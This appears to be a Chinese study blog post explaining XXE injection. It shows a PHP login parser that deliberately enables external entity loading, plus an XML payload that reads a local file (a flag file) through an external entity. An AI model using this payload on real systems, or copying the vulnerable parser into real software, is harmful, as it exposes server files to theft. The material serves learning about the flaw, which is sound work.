---
title: XXE攻击
tags:
  - XXE
categories: 网络安全知识学习
abbrlink: 16c3837a
date: 2020-11-09 20:18:13
---

　　XML语言，还是不能够理解<!--more-->

# 概述

　　XXE攻击（XML External Entity），也就是**XML外部实体注入漏洞**。这个漏洞显然和XML有关。

假设有个应用有一个很简单的功能，html有个表单提交，如下：

```xml
<login>
  <user>admin</user>
  <pass>123</pass>
</login>
```

服务端接受该xml之后，将其中的用户名和密码解析出来

```php
<?php
    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    echo "Username: ".$creds->user."</br>";
	echo "Password: ".$creds->pass;
?>
```

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZmVuZ3dlbmh1YS9JbWFnZUJlZC9yYXcvbWFzdGVyLzE1ODEwMDI1ODRfMjAyMDAyMDYyMzA0MzcyOTBfMjA2NjQxNzM4Mi5wbmc?x-oss-process=image/format,png)

如果给这个xml加上一段dtd，让xml解析我们引入的外部实体，这样，我们想读哪个文件，就读哪个文件。

```xml-dtd
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///e:/flag.txt" >]>
<login>
  <user>&xxe;</user>
  <pass>mypass</pass>
</login>
```

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZmVuZ3dlbmh1YS9JbWFnZUJlZC9yYXcvbWFzdGVyLzE1ODEwMDI1ODVfMjAyMDAyMDYyMzE4NTgyNzFfMTE3MTM5OTk5MC5wbmc?x-oss-process=image/format,png)